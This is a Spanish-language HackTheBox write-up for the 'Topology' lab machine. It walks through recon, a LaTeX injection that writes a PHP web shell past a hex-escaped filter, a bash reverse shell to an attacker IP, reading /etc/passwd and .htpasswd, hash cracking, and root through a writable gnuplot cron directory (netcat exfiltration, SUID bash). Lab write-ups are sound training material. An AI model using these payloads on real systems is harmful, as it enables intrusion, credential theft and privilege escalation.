@@ -1,0 +1,271 @@
+---
+title: "Topology"
+date: 2025-05-29 16:41:47 +0200
+categories: writeups HackTheBox
+tags: latexinyection rce infoleak criptografía máquina pspy gnuplot linux
+description: Writeup de la máquina Topology de Hackthebox.
+image: ../assets/images/posts/logos/hackthebox.png
+---
+## Reconocimiento
+
+En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:
+
+```bash
+openvpn lab_trr0r.opvn
+```
+
+Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104155547.png>)
+
+> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.217`.
+### Nmap
+
+En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.
+
+```bash
+nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.217 -oG allPorts
+```
+
+Observamos como nos reporta que se encuentran abiertos los puertos **22 y 80**.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104155708.png>)
+
+Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.
+
+A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.
+
+```bash
+nmap -p22,80 -sCV 10.10.11.217 -oN targeted
+```
+
+Observamos que en la captura de **Nmap** no veremos nada interesante.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104155720.png>)
+___
+## Explotación
+
+Como tenemos tan pocas opciones comenzaremos a ver la página web alojada en el puerto **80**, tras estar mirando un rato veremos que el email `lklein@topology.htb` pertenece al dominio `topology.htb` y además hay un link que lleva a `latex.topology.htb` por lo que efectivamente existe el dominio `topology.htb`.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104160215.png>)
+
+Antes de hacer el **Virtual Hosting** realizaremos fuzzing de directorios sobre la página web actual para no dejarnos ninguna pieza clave por lo que gracias a **Gobuster** ejecutaremos lo siguiente:
+
+```bash
+gobuster dir -u http://10.10.11.217 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js -t 100
+```
+
+Tras navegar tras los directorios descubiertos no encontraremos nada interesante:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104161120.png>)
+
+Como no hemos encontrado nada interesante pasaremos al siguiente paso, es decir a realizar fuzzing de directorios usando **Wfuzz** gracias al siguiente comando:
+
+```bash
+wfuzz -c -u http://topology.htb -H 'Host: FUZZ.topology.htb' -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hh=6767
+```
+
+Observamos que nos reporta dos subdominios adicionales (`dev` y `stats`) al que ya teníamos:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104161414.png>)
+
+Aparentemente conocemos todos los subdominios existentes por lo que ahora sí realizaremos **Virtual Hosting** para ello abriremos el `/etc/hosts` y añadiremos la siguiente línea: `10.10.11.217  topology.htb  latex.topology.htb  dev.topology.htb  stats.topology.htb`
+### stats.topology.htb
+
+A simple vista en este subdominio no veremos nada interesante, en él se muestran estadísticas respecto al servidor web pero parece que no funciona bien.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104161738.png>)
+### dev.topology.htb
+
+En este subdominio nos piden unas credenciales pero tras probar las típicas desistiremos. Además he de destacar que es el típico de panel autenticación propio de **apache2** en el cual existen dos tipos: **Digest** o **Basic** donde sus contraseñas se suelen guardar en **.htdigest* , **.htbasic** y **.htpasswd**.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104162059.png>)
+### latex.topology.htb
+
+Finalmente, veremos que en este subdominio esta habilitado el **Directory Listing** lo cual nos permitirá visualizar mejor la estructura de directorios y ficheros presentes. 
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104162544.png>)
+
+En **/equation.php** se encuentra la página principal la cual nos permite crear ecuaciones en **LaTeX** y exportarlas en un archivo **.PNG**. Para entenderlo mejor veremos un ejemplo, como input introduciremos lo siguiente: `\frac{x+5}{y-3}` y tal y como vemos a continuación
+nos devuelve nuestra ecuación exportada en formato imagen:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104163035.png>)
+#### LaTeX Injection
+
+En este punto lo primero que se nos ocurre es una **LaTeX Injection** ya que gracias a **LaTeX** existen muchas formas de lograr la ejecución de comandos remotamente (**LaTeX Command execution**) y de escribir en ficheros **LaTeX Write File** por lo que veremos dos formas de lograr el acceso de la máquina víctima, una de ella la **Vía intencionada** y la **Vía no intencionada**.
+##### Vía no intencionada
+
+En primer lugar se me ocurre probar con una **LaTeX Command execution** pero no entiendo porque no funciona por lo que probaré otras formas como lo son: **LaTeX Read File** o **LaTeX XSS** y finalmente me daré cuenta que tengo capacidad de escribir en un fichero por lo que estaremos abusando de una **LaTeX Write File** para crear un **cmd.php**.
+
+Para crear un **cmd.php** a través de una **LaTeX Write File** debemos de introducir el siguiente input:
+
+```latex
+\newwrite\outfile
+\openout\outfile=cmd.php
+\write\outfile{<?php system($_GET['cmd']); ?>}
+\closeout\outfile
+```
+
+Observamos que nos salta un error ya que estamos usando un comando no permitido:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104164547.png>)
+
+Para evitar este error intentaremos realizaremos un **bypassing** en cual consistirá en transformar algún carácter a **hexadecimal** del comando detectado como ilegal para así evitar que me salte el error de "_Illegal command detected. Sorry_", en definitiva el input quedará tal que así:
+
+```latex
+\newwrite\outfile
+\openout\outfile=cmd.php
+\^^77rite\outfile{<?php system($_GET['cmd']); ?>} % Convertiremos la w a ^^77 ya que en hexadecimal es 77 (man ascii).
+\closeout\outfile
+```
+
+Observamos que ahora no nos salta ningún error por lo que debemos de buscar el lugar donde se ha almacenado nuestro fichero **cmd.php** y nos daremos cuenta que se encuentra en **/tempfiles**:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104164950.png>)
+
+Una vez que hemos logrado subir un **cmd.php** y el servidor interpreta **php** tendremos ejecución remota de comandos (**RCE**) por lo que nos pondremos en escucha con **NetCat** (`nc -nvlp 443`) y nos enviaremos una **Reverse Shell** gracias al típico oneliner de bash (`bash -c "bash -i >%26 /dev/tcp/10.10.14.10/443 0>%261"`)
+
+Observaremos como recibimos la **bash** correctamente por lo que habremos ganado acceso a la máquina víctima y en este punto debemos de comenzar con la **Escalada de privilegios**.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104165811.png>)
+##### Vía intencionada
+
+Revisando los archivos que podemos ver gracias al **Directory Listing** nos llamará la atención un archivo llamado **equationtest.text** el cual es un archivo de pruebas con el siguiente contenido:
+
+```latex
+% Declaramos la clase del documento
+% En este caso, usamos 'standalone', que se utiliza para crear un documento
+\documentclass{standalone}
+
+% Incluimos un archivo externo llamado 'header' para añadir paquetes adicionales.
+\input{header}
+
+% Inicio del contenido del documento
+\begin{document}
+
+% Escribimos una integral doble usando el entorno matemático en línea ($ ... $).
+$ \int_{a}^b\int_{c}^d f(x,y)dxdy $
+
+% Fin del contenido del documento
+\end{document}
+```
+
+Como en el anterior archivo (**equationtest.tex**) está incluyendo el archivo **header.tex** pasaremos a ver su contenido y veremos que está incluyendo todos estos paquetes:
+
+```latex
+% vdaisley's default latex header for beautiful documents
+\usepackage[utf8]{inputenc} % set input encoding
+\usepackage{graphicx} % for graphic files
+\usepackage{eurosym} % euro currency symbol
+\usepackage{times} % set nice font, tex default font is not my style
+\usepackage{listings} % include source code files or print inline code
+\usepackage{hyperref} % for clickable links in pdfs
+\usepackage{mathtools,amssymb,amsthm} % more default math packages
+\usepackage{mathptmx} % math mode with times font
+```
+
+El paquete que más nos llama la atención es **listings** ya que aparentemente nos permite incluir archivos, tras buscar en internet nos daremos cuenta que podemos usar la siguiente instrucción: `\lstinputlisting{/etc/passwd}` para leer el `/etc/passwd` pero veremos que nos da un error:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104173923.png>)
+
+Si volvemos a mirar el archivo de ejemplo (**equationtest.tex**) nos daremos cuenta que está usando un dólar a cada lado de la expresión matemática: 
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104174011.png>)
+
+En este punto hemos de preguntarnos para que se usa el dólar en **LaTeX**, tras buscar en internet nos daremos cuenta que sirve para distinguir una **expresión matemática** de un **texto normal**, tal y como podemos ver a continuación:  
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104174133.png>)
+
+Buscaremos la diferencia entre ejecutar un comando con el dólar y sin el dólar: Finalmente, sacaremos la siguiente conclusión:
+- `\lstinputlisting{/etc/passwd}`: Generalmente **no funcionará** en sistemas seguros restringidos debido a políticas de seguridad
+- `$ \lstinputlisting{/etc/passwd} $`: Funciona pero sólo en entornos matemáticos y podría permitir la lectura indirecta.
+
+Como al entrar en un entorno matemático parece que de alguna forma **bypasseamos** las políticas de seguridad introduciremos el siguiente input: `$ \lstinputlisting{/etc/passwd} $` y nos daremos cuenta que somos capaces de leer el `/etc/passwd`.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104174804.png>)
+
+Una vez que tenemos capacidad de lectura lo primero que se nos ocurre es leer la **id_rsa** del único usuario que tiene una consola interactiva y no es el **root**, es decir **vdaisley** pero veremos que o bien no existe la clave privada o no tenemos permisos de lectura sobre ella.
+
+Tras un rato pensado recordaremos que en el subdominio **dev.topology.htb** existía una autenticación que me hace recordar a la de **apache2** por lo que intentaremos apuntar al `/etc/apache2/sites-available/000-default.conf` para ver los distintitos sitios virtuales que existen, y en caso de no encontrar nada en este archivo buscaremos por sus archivos de configuración individuales, he aquí un ejemplo: `/etc/apache2/sites-available/dev.topology.htb.conf`.
+
+Nos daremos cuenta que en el `/etc/apache2/sites-available/000-default.conf` están recogidos todos los subdominios y como bien hemos mencionado antes el que más nos llama la atención es el anteriormente mencionado **dev.topology.htb** el cual su **DocumentRoot** se encuentra en **/var/www/dev**.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104175524.png>)
+
+Como en el anterior archivo no encontramos ninguna política definida en referencia a la autenticación buscaremos por el archivo **.htaccess** (`/var/www/dev/.htaccess`) el cual nos permite configurar políticas adicionales y en dicho fichero veremos la ruta donde está ubicada el archivo con las contraseñas (**/var/www/dev/.htpasswd**).
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104175603.png>)
+
+Visualizaremos dicho fichero igual que llevamos haciendo un rato (`$ \lstinputlisting{/var/www/dev/.htpasswd} $`) y veremos el **hash** correspondiente al usuario **vdaisley** por lo que procederemos a **romperlo**.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104175615.png>)
+
+___
+## Escalada de privilegios
+### www-data
+
+En el caso de haber ganado acceso a través de una **Reverse Shell** realizaremos un **Tratamiento de la TTY** y nos daremos cuenta que en el directorio **/var/www/dev** en el fichero **.htpasswd** podemos ver un **hash** correspondiente al usuario **vdaisley**.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104170119.png>)
+#### Rompiendo el hash de vdaisley
+
+En este punto guardaremos el **hash** en un archivo y lo romperemos usando **hashcat** o **johntheripper**. 
+
+Con **johntheripper** debemos de ejecutar el siguiente comando:
+
+```bash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+Tal y como vemos a continuación romperemos el **hash** satisfactoriamente:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104170547.png>)
+
+Usando **hashcat** sería un poco más complicado ya que debemos de detectar el tipo de **hash** (`hashcat --example-hashes | grep "apache" -i -B 1`), una vez detectado debemos de ejecutar el siguiente comando:
+
+```bash
+hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt
+```
+
+Observamos que de igual formas nos crackea el **hash**: 
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104170455.png>)
+
+Una vez tenemos el **hash** intentaremos conectaremos por **ssh** (`ssh vdaisley@10.10.11.217`) y veremos que nos conectamos correctamente al igual que si lo hacemos con `su vdaisley`.
+### vdaisley
+
+> Destacar que para que nos funcione el <kbd>CTRL</kbd> + <kbd>L</kbd> (**clear**) debemos de hacer un `export TERM=xterm`.
+
+Una vez que hemos ganado acceso en la máquina víctima como el usuario **vdaisley** procederemos a escalar nuestros privilegios, en primer lugar buscaremos por las formas típicas (**Sudoers**, **SUID**, ...) y nos daremos cuenta que no encontramos nada interesante. 
+
+Tras estar buscando otras alternativas llegaremos al punto donde nos **transferiremos** **pspy** a la máquina víctima, lo ejecutaremos para así buscar por procesos que se estén ejecutando en segundo plano, y tal y como observamos en la captura de pantalla nos llamará la atención el siguiente proceso que se ejecuta múltiples veces:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104181018.png>)
+
+Básicamente este proceso se encarga de ejecutar todos los scripts acabados en **.plt** que se encuentren en **/opt/gnuplot** a través de la herramienta **gnuplot**, adicionalmente este proceso está siendo ejecutado por el **root** por lo que aquí tenemos una forma potencial de elevar nuestros privilegios.
+
+En primer lugar debemos de asegurarnos que podemos escribir en dicho directorio (**/opt/gnuplot**) y tal como vemos a continuación si que podemos:
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104181604.png>)
+
+Tras buscar en internet alguna forma potencial de crear un script **.plt** que nos permita elevar nuestros privilegios nos encontraremos con esta [web](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/) la cual nos indica como podemos ejecutar comandos por lo que nos crearemos un script llamado **test.plt** con el siguiente contenido:
+
+```bash
+system "whoami | nc 10.10.14.10 443"
+```
+
+Dicho script (**test.plt**) lo ubicaremos en **/opt/gnuplot** y le daremos permisos de ejecución (`chmod +x /opt/gnuplot/test.plt`) y tras habernos puesto en escucha con **NetCat** (`nc -nvlp 443`) previamente veremos que recibimos el output del comando (**root**).
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104182151.png>)
+
+Una vez hemos logrado ejecutar comandos como el usuario **root** dependerá de nuestra imaginación el modo de convertirnos en dicho usuario, en este caso optaré por otorgar permisos **SUID** por lo que modificaré el archivo **test.plt** con el siguiente contenido:
+
+```bash
+system "chmod +s /bin/bash"
+```
+
+Observamos que tras esperar un poco la **/bin/bash** obtiene permisos **SUID** por lo que ya nos habremos convertido en el usuario **root** de manera efectiva (**efective user id**).
+
+> Otra alternativa válida de convertirnos en **root** es a través de una **Reverse Shell**, o también introduciendo nuestra **id_rsa.pub** en el **authorized_keys** del **root**.
+
+![](<../assets/images/posts/2025-05-29-topology/Pasted image 20250104182856.png>)
